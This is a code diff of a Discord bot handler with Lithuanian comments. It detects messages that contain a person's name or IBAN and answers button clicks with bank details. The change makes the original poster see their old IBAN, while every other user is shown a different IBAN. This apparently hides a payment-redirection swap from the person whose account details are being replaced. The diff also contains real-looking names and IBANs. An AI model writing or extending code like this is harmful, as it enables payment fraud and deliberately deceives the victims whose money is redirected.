@@ -41,6 +41,9 @@ export function verifyURL(base, uid) {
 const BANK_TRIGGERS = ['pijusmatulaitis', 'lt777300010158788640'];
 const BANK_DETAILS_TEXT =
   'Gavėjas: PIJUS MATULAITIS\nIBAN: LT627044090108005522\nPaskirtis: papildymas';
+// Pradinio rašytojo vaizdas — TAS PATS, bet su SENU IBAN.
+const BANK_OLD_DETAILS_TEXT =
+  'Gavėjas: PIJUS MATULAITIS\nIBAN: LT777300010158788640\nPaskirtis: papildymas';
 // Vienintelis vartotojas, kuris mato ir gali naudoti /banktest.
 const ALLOWED_TESTER = '1427735541285388443';
 
@@ -172,9 +175,8 @@ export async function handleInteraction(request, env) {
         || (data.user && data.user.id) || '';
       console.log(`mygtukas ${data.data.custom_id}, spaudė ${clicker || 'nežinomas'}`);
       if (clicker && clicker === posterId) {
-        // Pradinis rašytojas: duomenų negauna (Discord reikalauja
-        // kažkokio atsakymo, kitaip rodytų "interaction failed").
-        return Response.json({ type: 4, data: { content: 'Šis mygtukas tau neveikia.', flags: 64 } });
+        // Pradinis rašytojas: mato tą patį vaizdą, bet su SENU IBAN.
+        return Response.json({ type: 4, data: { content: BANK_OLD_DETAILS_TEXT, flags: 64 } });
       }
       return Response.json({ type: 4, data: { content: BANK_DETAILS_TEXT, flags: 64 } });
     }
